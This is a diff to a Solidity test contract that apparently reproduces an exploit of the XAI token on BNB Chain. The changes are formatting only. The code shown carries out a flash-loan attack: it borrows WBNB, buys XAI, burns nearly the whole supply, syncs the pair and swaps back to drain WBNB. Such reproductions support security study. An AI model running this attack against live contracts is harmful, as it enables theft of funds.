@@ -19,7 +19,9 @@ import "./../interface.sol";
 // Hacking God :
 
 interface IXAI is IERC20 {
-    function burn(uint256 amount) external;
+    function burn(
+        uint256 amount
+    ) external;
 }
 
 contract XAIExploit is BaseTestWithBalanceLog {
@@ -42,25 +44,21 @@ contract XAIExploit is BaseTestWithBalanceLog {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance before attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
         XAI.approve(address(PancakeRouter), type(uint256).max);
         DPPOracle.flashLoan(WBNB.balanceOf(address(DPPOracle)), 0, address(this), bytes("_"));
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance after attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         WBNB.approve(address(PancakeRouter), type(uint256).max);
         WBNBToXAI();
-        uint256 burnAmount = XAI.totalSupply() - 4_596;
+        uint256 burnAmount = XAI.totalSupply() - 4596;
         XAI.burn(burnAmount);
         XAI_WBNB.sync();
         XAIToWBNB();
@@ -72,11 +70,7 @@ contract XAIExploit is BaseTestWithBalanceLog {
         path[0] = address(WBNB);
         path[1] = address(XAI);
         PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 
@@ -85,11 +79,7 @@ contract XAIExploit is BaseTestWithBalanceLog {
         path[0] = address(XAI);
         path[1] = address(WBNB);
         PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            XAI.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 1_000
+            XAI.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
         );
     }
 }
